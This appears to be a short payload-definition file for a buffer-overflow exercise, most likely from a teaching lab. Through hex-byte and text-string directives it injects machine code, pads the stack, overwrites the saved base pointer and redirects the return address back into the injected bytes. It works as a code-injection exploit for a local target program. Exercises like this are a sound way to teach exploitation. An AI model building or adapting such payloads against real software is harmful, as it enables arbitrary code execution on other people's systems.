# Use # for comments
# Use C for text strings to be copied to output
# Use x for hex data to be copied to output
#
# First, need the section ID (A or B)
#C A00000000ZA00000001ZA00000002ZA00000003ZA00000004ZA00000005ZA00000006ZA00000007ZA00000008ZA10000009ZA01000000ZA00000001ZA00000002ZA00000003ZA00000004ZA00000005ZA00000006ZA00000007ZA00000008ZA10000009ZA02000000ZA00000001ZA00000002ZA00000003ZA20000004ZA2256ZB300000C
#X c30940
#X b90940


# Add section 
C A

# Append attack code
X 55
X 4889e5
#X 48c7c569094000
#X 48c7c469094000
X e85fe9dfff
X 00000000000000000000
# padding
C A00000002ZA00000003ZA00000004ZA00000005ZA00000006ZA00000007ZA00000008ZA10000009ZA01000000ZA00000001ZA00000002ZA00000003ZA00000004ZA00000005ZA00000006ZA00000007ZA00000008ZA10000009ZA02000000ZA00000001ZA00000002ZA00000003ZA20000004ZA2256Z
# restore rbp
X 097efffffff70000
#X 7fffffffe790
# Return to buffer where attach code start up
X 012060

